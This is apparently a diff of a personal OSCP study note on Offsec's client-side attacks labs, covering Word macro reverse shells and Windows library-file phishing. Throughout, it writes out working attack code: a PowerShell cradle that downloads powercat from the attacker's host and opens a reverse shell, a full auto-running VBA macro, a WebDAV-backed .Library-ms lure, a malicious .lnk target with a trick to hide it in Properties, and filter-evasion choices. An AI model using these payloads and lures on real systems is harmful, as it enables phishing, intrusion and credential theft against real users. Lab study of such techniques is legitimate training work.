@@ -14,7 +14,7 @@ The core idea: client machines inside an org almost never expose services extern
 
 This module covers target reconnaissance for client-side attacks (12.1), exploiting Microsoft Office (12.2), and abusing Windows Library files (12.3).
 
-**⚠️ Status:** 12.1 fully done. 12.2.1 done (theory + all 3 quiz answers). 12.2.2 done (Office installed, program list confirmed). 12.2.3 Lab 1 done (macro → reverse shell confirmed on OFFICE). 12.2.3 Lab 2 (deliver to TICKETS, catch Administrator shell) **blocked**, OFFICE VM instance broke mid-rebuild (state reset + Office reinstall silently failing with zero diagnostic trace), needs a VM revert to resume, full troubleshooting trail logged in the Lab 2 section below. Rest of the module (12.3) still to come.
+**⚠️ Status:** 12.1 fully done. 12.2.1 done (theory + all 3 quiz answers). 12.2.2 done (Office installed, program list confirmed). 12.2.3 **fully done now**, both labs. Lab 1 (OFFICE macro → reverse shell) rebuilt twice across two fresh instances, both times working. Lab 2 (deliver to TICKETS, catch Administrator shell) finally cracked on the second resume: root cause of the repeated failures was never the VM/watcher-script, it was saving the Word doc as `.docx` instead of `.doc` both times (macros silently don't persist on `.docx` save, but still *appear* to work if tested live in the same session). Fixed, verified via a genuine cold reopen, delivered clean. Flag: `OS{cc21bba975986a21e782fffa572ded55}`. 12.3 (Windows library files) theory + full walkthrough written up, all 3 labs (HR137 delivery, MOTW true/false, ADMIN capstone) **still pending VM spin-up** (VM Group 1 + VM Group 2, distinct from the OFFICE/TICKETS pair used for 12.2.3). 12.4 Wrapping Up done.
 
 ---
 
@@ -258,22 +258,207 @@ Saved, closed, reopened, no re-prompt this time (only re-prompts if the filename
 
 ---
 
+#### 🔁 Lab 1 Rebuild (fresh instance, after prior OFFICE VM corruption)
+
+The original OFFICE instance broke beyond repair (see the Lab 2 troubleshooting saga below for the full story). Spinning up a brand-new instance gave **new IPs** and reset OFFICE back to bare Windows (no Office installed at all), so the whole chain had to be rebuilt from scratch. Logged granularly here specifically so this doesn't need re-deriving from memory next time.
+
+**New instance IPs (check the lab panel each fresh spin-up, these change every time):**
+- OFFICE (VM #1): `192.168.243.196`, `offsec` / `lab`
+- TICKETS (VM #2): `192.168.243.198`, no direct login (never RDP into this one, it's driven entirely by the simulated-user script)
+
+**Step 1: RDP in, confirm actual state before assuming anything**
+```bash
+xfreerdp /v:192.168.243.196 /u:offsec /p:lab /dynamic-resolution
+```
+*Found: Office not installed (Start menu has no Office apps), but `C:\tools\Office2019.img` still present. Confirms a full state wipe, not a partial/corrupted install this time.*
+
+**Step 2: Mount the installer image**
+Double-click `C:\tools\Office2019.img` in File Explorer. *Mounts as a new drive letter (`D:`), auto-launched `Setup.exe` from the mounted drive on this instance.*
+
+**Step 3: Let the install finish**
+No errors, installer window closed cleanly on completion (a few minutes).
+
+**Step 4: Clear Word's first-launch prompts**
+Open **Word** → dismiss the product key popup with **X** (starts 7-day trial, no need to activate) → accept the license agreement → decline optional data sharing.
+
+**Step 5: Create and save the document in macro-capable format**
+**File → Save As** → name `mymacro` → file type **Word 97-2003 Document (*.doc)** → Save. *`.docx` can run a macro in-session but can't persist one on save, has to be `.doc`/`.docm`.*
+
+**Step 6 (Kali): confirm your current VPN IP**
+```bash
+ip a show tun0
+```
+*Don't assume it's unchanged from last session, per the module's own earlier note about this shifting after a VPN reconnect. This session: `192.168.45.179`.*
+
+**Step 7 (Kali): host PowerCat and start the listener, two separate terminals**
+```bash
+cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 ~
+cd ~
+python3 -m http.server 80
+```
+```bash
+nc -nvlp 4444
+```
+
+**Step 8 (Kali): generate the base64-encoded (UTF-16LE) download cradle**
+```bash
+pwsh
+```
+```powershell
+$Text = 'IEX(New-Object System.Net.WebClient).DownloadString(''http://192.168.45.179/powercat.ps1'');powercat -c 192.168.45.179 -p 4444 -e powershell'
+$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+$EncodedText = [Convert]::ToBase64String($Bytes)
+$EncodedText
+```
+*Same UTF-16LE-then-base64 requirement `powershell -enc` expects, matches [[Common Web Application Attacks#9.3.1. Using Executable Files|9.3.1]]'s PowerShell reverse shell.*
+
+**Step 9 (Kali): chunk the payload into VBA-ready lines mechanically, not by hand**
+```bash
+b64='<paste $EncodedText output here>'
+python3 -c "
+s = 'powershell.exe -nop -w hidden -enc ' + '$b64'
+for i in range(0, len(s), 50):
+    print(f'    Str = Str + \"{s[i:i+50]}\"')
+"
+```
+*Generating the split programmatically rather than manually cutting the string at 50-char intervals avoids fat-fingering a chunk boundary, same mechanical-extraction principle as [[Common Web Application Attacks#9.1.2. Identifying and Exploiting Directory Traversals|9.1.2]]'s curl+sed key extraction lesson. Output is ready to paste straight into the VBA editor, no manual editing needed.*
+
+**Step 10: Build the macro in Word's VBA editor**
+**View → Macros → View Macros** (`Alt+F8`) → name `MyMacro` → **Macros in**: `mymacro.doc (document)`, **not** `Normal.dotm` → **Create**. *If Word prompts "already exists, replace?" (seen this session, likely just Word's own placeholder stub for the name), click **Yes**.*
+
+Replace the skeleton with:
+```vba
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    Dim Str As String
+
+    Str = Str + "<chunk 1 from Step 9's output>"
+    Str = Str + "<chunk 2>"
+    ' ...all chunks in order...
+
+    CreateObject("Wscript.Shell").Run Str
+End Sub
+```
+
+**Step 11: Save, close, reopen to trigger**
+Close the VBA editor → `Ctrl+S` (keep `.doc`) → close Word → double-click `mymacro.doc` in File Explorer to reopen → click **Enable Content** if the security bar appears.
+
+> **🛠️ Troubleshooting hit this session: first reopen produced no security bar and no autorun at all.**
+> Trust Center was confirmed set to the normal default ("Disable all macros with notification"), which should always show the yellow warning bar for a document containing macros. Instead: nothing, silent no-op.
+>
+> Manually running it via the Macros dialog (**View → Macros → select MyMacro → Run**) worked immediately and caught a shell fine. So the payload itself was never the problem.
+>
+> On a later retry, just reopening the file the normal way (double-click) worked correctly. Bar appeared (or ran silently as trusted), macro fired, shell caught. Root cause never fully pinned down, most likely an RDP-session redraw glitch on the first open, not a real Trust Center/VBA-scoping issue. (The code structure itself, `AutoOpen`/`Document_Open` both calling `MyMacro`, all in the document's own module, is the same shape that already worked in the original Lab 1 session.)
+>
+> **Takeaway:** if a freshly-saved macro doc doesn't fire on first reopen, don't assume the macro is broken. Verify via the Macros dialog first, that isolates payload-correctness from open-triggering, then just try reopening again before rewriting anything.
+
+**Step 12: Confirm the shell**
+```
+whoami
+```
+*Result: `offsec`, matching the RDP session's own logged-in user context, as expected.*
+
+#### Tags: #Lab1Rebuild #FreshInstance #VBA #WordMacros #PowerCat #TrustCenter #FlakyAutorun
+
+---
+
 #### Lab 2 (VM #2, TICKETS): delivering the macro to a simulated user
-> 🔧 Technique: in progress, currently blocked on a broken OFFICE VM instance, needs a revert before continuing. Full plan and troubleshooting trail below for picking back up.
+> 🔧 Technique: blocked twice now, for two *different* reasons across two separate sessions. First on a corrupted OFFICE instance (resolved by reverting/rebuilding, see [[Client-Side Attacks#🔁 Lab 1 Rebuild (fresh instance, after prior OFFICE VM corruption)|Lab 1 Rebuild]] above), now on TICKETS' own trigger automation not firing. Full plan, exact wording, and granular troubleshooting trail below so this doesn't need re-deriving.
 
-**The plan (not yet executed to completion):**
-1. Rebuild the macro on OFFICE (VM #1, `192.168.170.196`), same VBA payload as Lab 1
-2. Copy the resulting `.doc` off the VM via an RDP redirected drive: `xfreerdp /v:192.168.170.196 /u:offsec /p:lab /dynamic-resolution /drive:kali,/home/kali` (maps `/home/kali` as a network drive inside the session)
-3. Rename it to `ticket.doc`, upload to TICKETS (VM #2, `192.168.170.198`) via `curl -F "myFile=@ticket.doc" http://tickets.com:8000/upload` (form field confirmed via `curl -s http://tickets.com:8000/ | grep -iE "<form|<input|action="`, needs `192.168.170.198 tickets.com` in `/etc/hosts`)
-4. Wait up to ~3 minutes for the simulated-user script to open it, catch a reverse shell as Administrator, read the flag from the desktop's `flag.txt`
+**Exact task wording (from the Offsec walkthrough itself, worth quoting verbatim since assumptions about it already cost one wasted attempt this session):**
+> "Once you have confirmed that the macro from the previous exercise works, upload the document containing the macro MyMacro in the file upload form (port 8000) of the TICKETS (VM #2) machine with the name `ticket.doc`. A script on the machine, simulating a user, checks for this file and executes it. After receiving a reverse shell, enter the flag from the flag.txt file on the desktop for the Administrator user. For the file upload functionality, add tickets.com with the corresponding IP address in /etc/hosts. Please note that it can take up to three minutes after uploading the document for the macro to get executed."
 
-> **🛠️ Troubleshooting saga hit this session, VM state got wiped mid-work:**
-> - **First surprise:** reconnected to OFFICE (192.168.170.196) via a second `xfreerdp` session (this one with `/drive:kali,/home/kali` added) expecting to find `mymacro.doc` from Lab 1 still there. Instead: no `.doc` anywhere in the profile, and **Office itself wasn't installed anymore**. The VM instance had reset to blank state between the two RDP connections, all of Lab 1's on-target work was gone (the reverse shell we already caught and logged is still valid, the *document itself* just doesn't exist on disk anymore).
-> - **Second surprise, reinstall attempt failed differently:** `C:\tools\Office2019.img` was still present, mounted fine via `Mount-DiskImage`, `D:\Setup.exe` existed and launched (confirmed via `tasklist`), but exited almost immediately with **exit code 1** and **zero diagnostic trace**: no visible installer window, no Windows Defender detection (`Get-MpThreatDetection` empty), no temp files, no Click-to-Run log directory even created, running from an elevated (Run as Administrator) prompt didn't change anything.
-> - **Read on the "zero trace" symptom:** a real install failure (bad media, missing dependency, permissions) almost always leaves *something* behind, a log, a Defender event, a partial temp file. Getting literally nothing after a process launches and dies suggests the VM instance itself is broken, not a fixable config/permissions issue on our end. Same underlying judgment call as the Nessus "0 hosts / 0 vulnerabilities → suspect the lab instance, not your scan config" entry already in [[Reconnaissance & Enumeration (Decision Tree)]].
-> - **Next step when resuming:** revert/restart the OFFICE VM instance from the lab control panel before attempting the install again, rather than continuing to debug a phantom failure on a likely-corrupted instance.
+**Key hard requirements confirmed from that wording, easy to get wrong:**
+- Port is **8000**, not 80 (confirmed both in the module text and by directly enumerating the target, matches).
+- Uploaded filename must be **exactly `ticket.doc`**, nothing else. (Wasted one troubleshooting cycle this session testing `ticket2.doc` to rule out a same-filename-ignored theory. Invalid test, the watcher isn't looking for that name at all.)
+- Wait window is **up to 3 minutes** per attempt.
 
-**Lab answer:** Pending — full chain still needs: OFFICE VM revert → reinstall Office → rebuild macro → copy off via redirected drive → upload to TICKETS → catch shell → read flag.
+**The plan:**
+1. Rebuild/confirm the macro on OFFICE (VM #1), same VBA payload as Lab 1 (done, see rebuild section above)
+2. Copy the resulting `.doc` off the VM via an RDP redirected drive
+3. Rename it to `ticket.doc` exactly, upload to TICKETS via the confirmed form
+4. Wait up to ~3 minutes for the simulated-user script, catch a reverse shell as Administrator, read the flag from the desktop's `flag.txt`
+
+**This session's granular attempt (fresh instance, OFFICE working fine this time):**
+
+**Step 1: Fix the stale `/etc/hosts` entry**
+```bash
+grep tickets.com /etc/hosts
+```
+*Found a leftover line from the old IP range: `192.168.170.198 tickets.com`. Needed updating to this session's IP, not appending fresh (would've left a conflicting duplicate).*
+```bash
+sudo sed -i 's/192.168.170.198 tickets.com/192.168.243.198 tickets.com/' /etc/hosts
+```
+*Turned out there were actually **two** stale lines (both got fixed independently by the same sed, since sed processes each matching line). Left as two identical, both-correct lines rather than deduping, purely cosmetic, doesn't affect resolution (confirmed later via `getent hosts`).*
+
+**Step 2: Confirm the upload form's exact field name**
+```bash
+curl -s http://tickets.com:8000/ | grep -iE "<form|<input|action="
+```
+*Confirmed: `action="http://tickets.com:8000/upload"`, field `name="myFile"`.*
+
+**Step 3: Copy `mymacro.doc` off OFFICE via a redirected-drive RDP session**
+```bash
+xfreerdp /v:192.168.243.196 /u:offsec /p:lab /dynamic-resolution /drive:kali,/home/kali
+```
+*Opens a second RDP connection (separate from any session already holding a caught shell) with `/home/kali` mapped as a drive inside Windows (labelled `kali on kali` this session, wording varies by FreeRDP version). Copy-paste `mymacro.doc` from wherever it was saved (Desktop, this session) onto that mapped drive.*
+
+**Step 4: Rename and upload**
+```bash
+cp ~/Desktop/mymacro.doc ~/Desktop/ticket.doc
+curl -F "myFile=@$HOME/Desktop/ticket.doc" http://tickets.com:8000/upload
+```
+*Response: `Successfully Uploaded File: ticket.doc`.*
+
+> **🛠️ Troubleshooting hit this session: multiple clean uploads of the correctly-named `ticket.doc`, listener confirmed healthy each time, nothing ever landed.**
+> Ruled out, in order:
+> - **Listener port conflict.** No, `nc -nvlp 4444` showed a clean `listening on [any] 4444` each time, no bind errors.
+> - **Same-filename-ignored-on-reupload theory.** Tested by uploading as `ticket2.doc` instead. Invalid test in hindsight: the module's own wording confirms the watcher specifically checks for `ticket.doc`, so of course a different name never triggers it. Wasted a cycle, but confirmed the exact-filename requirement is real and load-bearing.
+> - **Wrong IP / stale DNS.** Checked directly:
+>   ```bash
+>   getent hosts tickets.com
+>   curl -v http://tickets.com:8000/ 2>&1 | head -15
+>   ```
+>   Both confirmed resolution and connection correctly hitting `192.168.243.198`, `200 OK` on a plain GET. Ruled out.
+> - **Duplicate `/etc/hosts` lines causing some kind of split/round-robin behavior.** No, both lines are identical (same IP), so there's nothing to round-robin between. `/etc/hosts` is purely local to Kali anyway, it has zero bearing on how TICKETS' own internal script behaves.
+>
+> **Current leading theory (unconfirmed): the simulated-user watcher script is one-shot, not a repeating loop.** It likely watches for `ticket.doc` to appear, opens/executes it exactly once, then stops checking permanently, regardless of later re-uploads under the same name. The very first upload this session happened *before* the listener was actually running (mid-setup), so if the watcher fired on that first appearance and got no callback destination, it may have already "used up" its only execution and gone quiet for good. Matches [[Common Web Application Attacks#9.3.1. Using Executable Files|9.3.1]]'s repeated lesson about verifying every piece of infrastructure (listener *and* target) is actually ready before the trigger fires, not after.
+> - **Fix to try on resume:** revert/restart the **TICKETS** instance specifically (not OFFICE this time) from the lab control panel, to reset whatever one-shot state it's tracking. Then, critically, **get the listener running and confirmed healthy *before* the very first upload**, so there's no wasted first shot to burn.
+
+> **🔄 Correction (2026-08-06, next session): the one-shot-watcher theory above was very likely wrong.** Resumed on a fresh instance, rebuilt the macro, and hit a near-identical dead end again, upload succeeded, listener was healthy, nothing fired. Turned out the actual mistake, on both attempts, was saving the Word document as `.docx` instead of `.doc`. Word silently **strips macros entirely on save to `.docx`**, no warning, no error dialog, the file just quietly ends up with no code inside it. A macro built and tested live in the same Word session still *appears* to work (it's running from memory, not from the saved file), which is exactly what made this so easy to miss both times, the live test looked fine, only a genuine cold reopen (close Word fully, reopen from disk) exposes that the payload never actually persisted. Once re-saved correctly as `.doc` and verified via an actual cold reopen (not just the live-session trigger), delivery to TICKETS worked on the very next attempt, no VM revert needed, no filename-based one-shot theory required. **Lesson: verify `.doc`/`.docm` format explicitly before ever trusting a "it worked when I tested it" result for a macro delivery chain**, and don't fully trust an unconfirmed root-cause theory (like the one-shot watcher above) just because the cheaper explanations were checked, always keep "did I actually verify this survives a cold reopen" on the list.
+
+**Step 7: Confirm privilege, navigate to the flag, read it**
+```
+whoami
+cd C:\Users\Administrator\Desktop
+dir
+type flag.txt
+```
+```
+PS C:\Users\Administrator\Pictures> whoami
+tickets\administrator
+PS C:\Users\Administrator\Pictures> cd C:\Users\Administrator\Desktop
+PS C:\Users\Administrator\Desktop> dir
+
+    Directory: C:\Users\Administrator\Desktop
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----          8/6/2026  12:20 PM             38 flag.txt
+
+PS C:\Users\Administrator\Desktop> type flag.txt
+OS{cc21bba975986a21e782fffa572ded55}
+```
+*`whoami` confirmed `tickets\administrator` before even navigating anywhere, callback landed with full admin privilege straight away, no privesc needed. The shell landed in `C:\Users\Administrator\Pictures` (working directory inherited from wherever the delivered process happened to spawn), one `cd` away from the actual Desktop.*
+
+**Lab answer:** **`OS{cc21bba975986a21e782fffa572ded55}`**, `tickets\administrator`, flag on the Administrator desktop. ✅ Done.
 
 ---
 
@@ -284,6 +469,214 @@ Saved, closed, reopened, no re-prompt this time (only re-prompts if the filename
 
 **Question:** true or false, there's no difference in the results between AdBlocker enabled vs disabled?
 
-**Lab answer:** **False** — there IS a difference. Makes sense given how the detailed fingerprint data actually gets collected: the *reliable* half of a Canarytoken's info (the part beyond the raw, spoofable User-Agent string) comes from **JavaScript actively running in the browser** to probe its real environment. AdBlockers commonly block tracking/fingerprinting scripts as part of their normal job, so with one enabled, that JS either doesn't run at all or gets a reduced picture, giving a thinner/different result than the same link opened with no blocker in the way.
+**Lab answer:** **False.** There IS a difference. Makes sense given how the detailed fingerprint data actually gets collected: the *reliable* half of a Canarytoken's info (the part beyond the raw, spoofable User-Agent string) comes from **JavaScript actively running in the browser** to probe its real environment. AdBlockers commonly block tracking/fingerprinting scripts as part of their normal job, so with one enabled, that JS either doesn't run at all or gets a reduced picture. Thinner/different result than the same link opened with no blocker in the way.
 
 **Practical takeaway for a real engagement:** a target running an AdBlocker (increasingly common) may give you a less complete fingerprint than expected, worth keeping in mind before fully trusting a single fingerprinting pass, especially if the result looks suspiciously sparse.
+
+---
+
+## 12.3. Abusing Windows Library Files
+
+**Why this technique exists, and why macros alone aren't enough anymore.** Per [[Client-Side Attacks#12.2.1. Preparing the Attack|12.2.1]]'s own MOTW/macro-blocking coverage, Office macros are a well-worn enough vector that security products actively scan for them, Microsoft ships GPO templates specifically to lock them down, and most security-awareness training explicitly warns staff about them. That combination makes macros a genuinely hard sell on a hardened target. Windows library files (`.Library-ms`) are a lesser-known alternative that routes around all three defenses, not because the underlying idea is more sophisticated, but because almost nobody is looking for it.
+
+> ℹ️ **GPO refresher, if needed:** Microsoft's own overview covers what a Group Policy Object actually is and how it's structured/replicated: [learn.microsoft.com/.../group-policy-overview](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/group-policy/group-policy-overview)
+
+### 12.3.1. Obtaining code execution via Windows library files
+
+**What a library file actually is:** a virtual container (`.Library-ms`) that connects Windows Explorer to content sitting somewhere else entirely, a web service, a network share, anything reachable. Double-click one and Explorer renders that remote content as if it were an ordinary local folder. Legitimate use case: the built-in "Documents"/"Pictures" libraries in Explorer are exactly this mechanism, just pointed at local folders instead of something remote.
+
+**The two-stage attack this enables:**
+1. **Stage 1, the library file itself.** Delivered to the victim (email attachment is the classic vector). Double-clicking it makes a WebDAV share on the attacker's box appear as a normal-looking local directory in Explorer.
+2. **Stage 2, a `.lnk` shortcut sitting inside that WebDAV directory.** The victim still has to double-click *this* to actually trigger anything, it launches a PowerShell reverse shell via a download cradle.
+
+**Why not just email a link to a hosted `.lnk` file directly, skipping the library-file step entirely?** Because spam filters and mail security products actively inspect link destinations and flag executable file types before the email ever reaches the inbox. A `.Library-ms` attachment, by contrast, gets passed straight through by most of these same filters, it isn't recognized as a suspicious file type the way a direct link to an `.exe`/`.lnk` download would be. Once it lands and gets opened, Explorer just quietly renders the WebDAV content as a trusted-looking local folder, no further filtering happens at that point.
+
+#### Step 1: Set up a WebDAV share on Kali with WsgiDAV
+
+```bash
+sudo apt install python3-wsgidav
+mkdir /home/kali/webdav
+touch /home/kali/webdav/test.txt
+wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
+```
+*`--host=0.0.0.0` listens on all interfaces, `--port=80` (WebDAV over plain HTTP is what the library file will expect), `--auth=anonymous` disables auth entirely (the victim's Explorer session won't be prompted for credentials), `--root` points it at the share directory. `test.txt` is just a placeholder to confirm the share is serving content before building anything else.*
+
+**Confirm it's live:** browse to `http://127.0.0.1` (or the WebDAV host's IP from another box) and check `test.txt` is listed.
+
+#### Step 2: Build the Windows library file's XML
+
+Library files are hand-editable XML (Notepad works, VS Code is nicer for syntax highlighting) with three logical sections: general library info, library properties, and library locations. Built via RDP into the prep machine (VM #1 of whichever VM group), using VS Code on the desktop.
+
+**General info: namespace and identity.**
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+
+</libraryDescription>
+```
+*Namespace is fixed for the Windows 7+ library file format, don't change it. Everything else goes inside `<libraryDescription>`.*
+
+```xml
+<name>@windows.storage.dll,-34582</name>
+<version>6</version>
+```
+*`name` isn't an arbitrary string, it's a DLL+string-resource-index reference, per the [Library Schema `name` element docs](https://learn.microsoft.com/en-us/windows/win32/shell/schema-library-name). `@shell32.dll,-34575` is the other commonly-cited option, `@windows.storage.dll,-34582` was chosen here specifically to dodge naive text filters that pattern-match on the literal string "shell32". `version` is just an arbitrary numeral.*
+
+```xml
+<isLibraryPinned>true</isLibraryPinned>
+<iconReference>imageres.dll,-1003</iconReference>
+```
+*Pinning it to Explorer's navigation pane and giving it a real Windows icon are both purely cosmetic legitimacy details, small things that make a target less likely to hesitate. `imageres.dll,-1002` is the Documents icon, `-1003` is Pictures, used here since Pictures reads as more benign/less "this touches my files" than Documents.*
+
+```xml
+<templateInfo>
+<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+</templateInfo>
+```
+*Controls which columns/details view Explorer defaults to when the library opens, this GUID is the Documents folder type. Full list of known-folder GUIDs (for picking a different one) is in Microsoft's [`KNOWNFOLDERID` reference](https://learn.microsoft.com/en-us/windows/win32/shell/knownfolderid).*
+
+**Library locations, the actual payload of the whole file, points at the WebDAV share:**
+```xml
+<searchConnectorDescriptionList>
+<searchConnectorDescription>
+<isDefaultSaveLocation>true</isDefaultSaveLocation>
+<isSupported>false</isSupported>
+<simpleLocation>
+<url>http://<kali_ip></url>
+</simpleLocation>
+</searchConnectorDescription>
+</searchConnectorDescriptionList>
+```
+*`url` is the one tag that actually matters functionally, everything else in the file is dressing. `isSupported` is undocumented but needed for compatibility, set `false`. Full annotated schema reference: [Library Description Schema, Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/shell/library-schema-entry).*
+
+**Full assembled file** (save as `config.Library-ms` on the desktop, via VS Code's File → New Text File → paste → Save As):
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+<name>@windows.storage.dll,-34582</name>
+<version>6</version>
+<isLibraryPinned>true</isLibraryPinned>
+<iconReference>imageres.dll,-1003</iconReference>
+<templateInfo>
+<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+</templateInfo>
+<searchConnectorDescriptionList>
+<searchConnectorDescription>
+<isDefaultSaveLocation>true</isDefaultSaveLocation>
+<isSupported>false</isSupported>
+<simpleLocation>
+<url>http://<kali_ip></url>
+</simpleLocation>
+</searchConnectorDescription>
+</searchConnectorDescriptionList>
+</libraryDescription>
+```
+
+#### Step 3: Test it, and handle the WebDAV self-rewrite gotcha
+
+Double-click `config.Library-ms` on the desktop. Expected: Explorer opens it like a normal folder and `test.txt` shows up, confirming the WebDAV connection works. Bonus: the Explorer address bar just shows `config`, no visible indication it's actually a remote location, good cover.
+
+> **⚠️ Gotcha: opening the file mutates it.** Reopen `config.Library-ms` in VS Code afterward and two things changed: a new `serialized` tag appeared (base64-encoded location info), and the `url` tag's content flipped from `http://<kali_ip>` to a UNC-style path (`\\<kali_ip>\DavWWWRoot`). Windows silently "optimizes" the file for its own native WebDAV client the first time it's opened. The library file still works in this mutated state on the machine that mutated it, but the serialized/UNC version may **not** work correctly on a different machine or after a restart, risking an empty-looking WebDAV share for the actual victim.
+> **Fix:** before sending the file anywhere, reset it back to the original plain XML (re-paste the full listing from Step 2 over whatever's currently in the file). This has to be redone every time the file gets test-opened, but since a real assessment only needs the victim to open it once, it's a minor annoyance rather than a blocker.
+
+#### Step 4: Build the `.lnk` shortcut payload (the actual reverse-shell trigger)
+
+Right-click the desktop → **New → Shortcut**. In the "type the location" field, point it at PowerShell with a download-cradle argument, same PowerCat pattern as [[Client-Side Attacks#12.2.3. Leveraging Microsoft Word Macros|12.2.3]]'s macro payload, just delivered via a shortcut's target instead of VBA:
+```powershell
+powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<kali_ip>:8000/powercat.ps1');powercat -c <kali_ip> -p 4444 -e powershell"
+```
+Name it something benign-sounding when prompted, e.g. `automatic_configuration`, matching whatever the pretext promises.
+
+> 🔗 **RevShells**: [revshells.com](https://www.revshells.com/) can generate this exact PowerShell-shortcut-target style payload directly if you'd rather not hand-type it.
+> 🔗 **HackTricks** LNK payload techniques: [github.com/HackTricks-wiki/hacktricks](https://github.com/HackTricks-wiki/hacktricks/blob/master/src/generic-methodologies-and-resources/phishing-methodology/phishing-documents.md), the "Backdoored Documents & Files" page has two dedicated sections on more advanced `.lnk` chains (ZIP-embedded fileless payloads, decoy-first staging with scheduled-task persistence) beyond the single-stage PowerCat cradle used here. *(Linking to the GitHub source per [[reference-oscp-external-resources]]'s workaround, the hosted book site is paywalled.)*
+
+**Evasion trick for a tech-savvy target who checks the shortcut's Properties first:** Windows only displays the first ~255 characters of a shortcut's target field in the Properties window, but the actual target can hold up to 4096. Padding the malicious command with a delimiter followed by a long, boring, benign-looking command pushes the real payload past what's visible in Properties, anyone eyeballing it before running sees only the harmless-looking prefix/suffix.
+
+**Where to host `powercat.ps1`, and why not just drop it on the WebDAV share itself:** the WebDAV share needs to stay writable (useful for pulling files off a compromised target later), and a writable share is exactly the kind of place AV/EDR might quarantine a payload sitting in plain sight. A plain `python3 -m http.server 8000` serving it separately avoids that risk entirely, same tool used throughout [[Common Web Application Attacks]] and [[Client-Side Attacks#12.2.3. Leveraging Microsoft Word Macros|12.2.3]].
+
+#### Step 5: Local test (CLIENT137, VM #1)
+
+```bash
+python3 -m http.server 8000    # serving powercat.ps1
+nc -nvlp 4444
+```
+Double-click the shortcut on the desktop, confirm the "run this application" prompt, accept it. Expected: listener catches a PowerShell prompt, confirming the full chain (library file → WebDAV → shortcut → PowerCat) works end to end before ever touching the real target.
+
+#### Step 6: Full delivery to a target (HR137, via a simulated email/SMB drop)
+
+**The pretext matters as much as the payload**, matching everything already covered in [[Phishing Basics]]. Example pretext used here: posing as a new IT team member rolling out a "new management platform," asking the target to open the attachment and double-click a "configuration" shortcut inside it.
+
+**Staging on Kali before delivery:**
+```bash
+cd ~/webdav
+rm test.txt                              # remove the placeholder
+# copy automatic_configuration.lnk and config.Library-ms into ~/webdav too
+python3 -m http.server 8000              # powercat.ps1
+wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
+nc -nvlp 4444
+```
+
+**Delivery, simulated here via an SMB share (a real assessment would more likely use email). Only the library file goes to the target, the `.lnk` stays on the WebDAV share for it to reach:**
+```bash
+smbclient //<target_ip>/share -c 'put config.Library-ms'
+```
+*`-c` runs a single command non-interactively rather than dropping into an interactive `smb: \>` prompt, same idea as [[Common Web Application Attacks]]'s `smbclient` usage but scripted for a one-shot upload.*
+
+Once the simulated user opens the delivered library file and then the shortcut inside it, the listener catches a shell in the target's own context (e.g. `hr137\hsmith`).
+
+🔁 **Similar to:** the overall two-stage "get something trusted-looking in front of the user, deliver the actual payload from infrastructure you control" shape mirrors [[Client-Side Attacks#12.2.3. Leveraging Microsoft Word Macros|12.2.3]]'s macro delivery and [[Common Web Application Attacks#9.2.3. Remote File Inclusion (RFI)|9.2.3]]'s RFI-hosted-webshell pattern. The core lesson repeats across all of them: the delivery mechanism and the actual execution payload don't have to be the same file, splitting them is often what gets past filtering in the first place.
+
+> 🔗 **Further reading:** [v4resk/red-book: Windows Library Files](https://github.com/v4resk/red-book/blob/main/redteam/weapon/code-execution/windows-library-files.md), a red-team reference covering this exact technique end to end, useful for variations beyond what's covered here.
+
+**Worth knowing: this file type has a real, patched CVE pair beyond what the module covers.** [CVE-2025-24054 / CVE-2025-24071](https://github.com/helidem/CVE-2025-24054_CVE-2025-24071-PoC) cover a related but distinct bug: a `.library-ms` file containing a UNC path, when merely **opened or previewed** in Explorer (no `.lnk` double-click needed at all), triggers an outbound SMB authentication attempt to whatever server the UNC path names. Point that at a Responder listener instead of a WebDAV share and it leaks the victim's NTLMv2 hash directly, no second-stage shortcut required. Same file family, different goal (credential capture over authentication-forcing rather than a reverse shell), worth remembering as a lighter-weight variant if a full two-stage chain isn't necessary.
+
+**On GTFOBins and PayloadsAllTheThings for this section:** deliberately not cited here. GTFOBins is Linux SUID/sudo/capability-specific, doesn't apply to a Windows client-side delivery chain. PayloadsAllTheThings was checked directly (no guessed links) and doesn't currently have a dedicated page for `.library-ms`/WebDAV-lure phishing, its shortcut/LNK coverage lives mostly in the Windows privesc and reverse-shell-cheatsheet pages already linked elsewhere in this vault, not this specific delivery technique.
+
+#### Tags: #WindowsLibraryFiles #LibraryMs #WebDAV #WsgiDAV #LNKShortcut #PowerCat #ReverseShell #MOTW #TwoStageAttack #ClientSideAttack #CVE202524054
+
+> 📋 Generalized copy-pasteable commands: [[Reconnaissance & Enumeration#Exiftool (Document Metadata Analysis)|Command Appendix]] *(to be extended once labs are complete)*
+> 🧭 Quick lookup: [[Reconnaissance & Enumeration (Decision Tree)|Decision Tree]]
+
+---
+
+## 🎯 Related Boxes to Practice
+
+Checked properly this time (per [[feedback-oscp-methodology-linking]]'s box-verification rule) rather than guessing: **no confident HTB match for this specific technique.** Standard HTB machines run unattended, there's no simulated user to double-click a phished library file or shortcut, so the "get a target to open something" half of this vector genuinely can't be replicated on a normal box the way [[Common Web Application Attacks]]'s web vulnerabilities could. That's exactly why Offsec built dedicated simulated-user labs (HR137/TICKETS, ADMIN) for this module instead.
+
